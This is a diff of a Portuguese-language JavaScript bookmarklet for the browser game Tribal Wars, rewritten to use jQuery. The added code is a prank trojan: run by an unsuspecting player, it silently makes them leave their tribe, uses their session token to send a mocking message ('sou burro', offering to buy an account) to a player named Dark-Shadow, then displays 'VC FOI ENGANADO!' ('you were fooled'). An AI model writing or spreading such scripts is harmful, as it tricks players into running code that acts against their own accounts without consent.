@@ -1,35 +1,31 @@
-javascript:
+javascript:(function(){
+    const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'});
+    TribalWars.get(url);
 
-const url = TribalWars.buildURL('GET', {screen: 'ally', action: 'exit'})
+    function cada_mp(player, msg, subj) {
+        const parts = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=');
+        const postUrl = parts[0];
+        const h = parts[1] || '';
 
-TribalWars.get(url)
-
-function cada_mp(player, msg, subj) {
-    var r;
-    var t;
-    var l = TribalWars.buildURL("POST", 'mail', { mode:'new', action: 'send' }).split('&h=')
-
-
-    var formData = new FormData();
-
-    formData.append('to', player.player || '');
-    formData.append('subject', subj || 'ola' );
-    formData.append('text', msg || '' );
-    formData.append('extended', '0');
-    formData.append('send', 'Enviar' );
-    formData.append('h', l[1] || '' );
-
-    r = new XMLHttpRequest();
-    r.open("POST", l[0], true);
-    function processResponse() {
-        if (r.readyState == 4 && r.status == 200){
-
-            UI.SuccessMessage("VC FOI ENGANADO!")
+        $.ajax({
+            url: postUrl,
+            type: 'POST',
+            data: {
+                to: player,
+                subject: subj || 'ola',
+                text: msg || '',
+                extended: 0,
+                send: 'Enviar',
+                h: h
+            },
+            success: function() {
+                UI.SuccessMessage("VC FOI ENGANADO!");
+            },
+            error: function(xhr) {
+                UI.ErrorMessage("Falha ao enviar mensagem. Código: " + xhr.status);
             }
-        };
-    r.onreadystatechange = processResponse;
-    r.send(formData);
+        });
+    }
 
-}
-
-cada_mp('Dark-Shadow', 'oi gostaria de comprar sua conta kkk', 'sou burro')
+    cada_mp('Dark-Shadow', 'oi gostaria de comprar sua conta kkk', 'sou burro');
+})();
